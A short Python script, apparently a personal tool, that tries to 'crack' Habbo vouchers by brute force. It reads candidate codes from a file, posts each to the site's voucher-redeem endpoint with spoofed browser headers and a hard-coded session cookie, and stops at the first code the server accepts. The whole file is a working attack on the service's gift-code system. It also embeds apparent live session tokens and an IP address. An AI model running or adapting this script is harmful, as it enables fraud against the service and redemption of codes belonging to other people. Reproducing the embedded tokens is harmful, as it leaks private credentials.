# voucher.py
# try to crack habbo vouchers
#
# author: ronny macmaster
import requests
import time

# init request values
voucher = ""
url = 'https://www.habbo.com/shopapi/voucher/redeem'
values = {'voucherCode': ''}
headers = {'User-Agent': "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0",
           'Referer': "https://www.habbo.com/shop",
           'Host': "www.habbo.com",
           'Cookie': "browser_token=s%3AlUgEQ4hjYZ9bzo0zcYJA9phJYmPrmvNyrKc-lOL236A.MxK6GKvDzMmHVKM%2BJzRHBxFHzkG0J6WXx18sy3awNxQ;\
                        __uis=; YPF8827340282Jdskjhfiw_928937459182JAX666=70.114.219.70;\
                        _ga=GA1.2.1750761994.1459562815; \
                        __gads=ID=1fef0256f7fce098:T=1459562820:S=ALNI_MaPvxPlrvUCK7zK3OWRSbZdyhNgsQ; \
                        __utma=78068493.1750761994.1459562815.1459648522.1460161948.6;\
                        __utmz=78068493.1459563065.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none);\
                        _gat=1; session.id=s%3AxN0dyDRBJFcqNuxWSKG9gKHqwsxStna6rRcNrd17OLs.nQV0UOa13W1KHKtnWUTJxUSM9ZOMZjz%2BLItXTsryn7s;\
                        __utmb=78068493.28.9.1460162120907; __utmc=78068493; __utmt=1"
           }

# read voucher file
vhand = open("vouchers")

# send requests
for voucher in vhand:
    values["voucherCode"] = voucher.rstrip()
    r = requests.post(url, data=values, headers=headers)
    resp = r.content
    time.sleep(1)
    # check valid voucher
    if not resp.startswith('{"error":'):
        print resp
        print "voucher = " + voucher
        exit()
    else:
        print resp
